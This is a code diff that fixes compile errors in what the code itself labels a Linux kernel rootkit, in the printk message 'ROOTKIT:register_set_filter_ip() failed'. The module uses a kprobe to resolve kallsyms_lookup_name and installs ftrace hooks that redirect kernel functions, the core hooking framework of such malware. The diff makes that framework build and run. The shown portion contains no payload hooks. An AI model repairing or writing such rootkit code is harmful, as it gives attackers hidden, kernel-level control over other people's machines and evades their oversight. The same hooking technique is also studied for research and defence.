@@ -52,11 +52,11 @@ struct ftrace_hook {
 
 static int resolve_hook_address(struct ftrace_hook *hook)
 {
-  #if LINUX_VERSION_CODE >+ KERNEL_VERSION(5,7,0)
+  #if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
     static struct kprobe kp ={
       .symbol_name ="kallsyms_lookup_name"
     };
-    typedef uninsigned long (*kallsyms_lookup_name_t)(const char* name);
+    typedef unsigned long (*kallsyms_lookup_name_t)(const char* name);
     static kallsyms_lookup_name_t my_kallsyms_lookup_name =NULL;
     if (my_kallsyms_lookup_name==NULL){
       register_kprobe(&kp);
@@ -77,15 +77,15 @@ static int resolve_hook_address(struct ftrace_hook *hook)
     }
 
   #if USE_FENTRY_OFFSET
-    *((uninsigned long*)) hook->original =hook->address +MCOUNT_INSN_SIZE;
+    *((unsigned long*) hook->original) =hook->address +MCOUNT_INSN_SIZE;
   #else 
-    *((uninsigned long*)) hook->original =hook->address;
+    *((unsigned long*) hook->original) =hook->address;
   #endif
   return 0;
 }
 
 static void notrace fh_trace_thunk(unsigned long ip, unsigned long parent_ip,struct ftrace_ops *ops,struct ftrace_regs *fregs){
-  struct ftrace_hook* hook= container_of(ops,struct ftrace_ops , ops)
+  struct ftrace_hook* hook= container_of(ops,struct ftrace_hook , ops);
   struct pt_regs *regs = ftrace_get_regs(fregs);
   if (!regs) {
     printk(KERN_DEBUG"Problem with ftrace_get_regs");
@@ -106,11 +106,11 @@ static int install_hook (struct ftrace_hook* hook){
   if (error){
     return error;
   }
-  hook->ops.func=ftrace_thunk;
-  hook->ops.flag=FTRACE_OPS_FL_SAVE_REGS //save cpu regs
+  hook->ops.func=fh_trace_thunk;
+  hook->ops.flags=FTRACE_OPS_FL_SAVE_REGS //save cpu regs
                     | FTRACE_OPS_FL_RECURSION //enable recursion handling
                     | FTRACE_OPS_FL_IPMODIFY;
-  error=ftrace_set_filter_ip(&hook->ops,  ,hook->address,0,0);
+  error=ftrace_set_filter_ip(&hook->ops,hook->address,0,0);
   if (error) {
     printk(KERN_DEBUG"ROOTKIT:register_set_filter_ip() failed %d\n",error);
     return error;
@@ -142,7 +142,7 @@ int install_hooks(struct ftrace_hook *hooks,size_t count){
   for (i=0;i<count;i++){
     error=install_hook(&hooks[i]);
     if (error) {
-      goto process_error
+      goto process_error;
     }
   }
   return 0;
@@ -159,7 +159,4 @@ void remove_hooks(struct ftrace_hook* hooks, size_t count) {
         remove_hook(&hooks[i]);
     }
 }
-
-
-
 
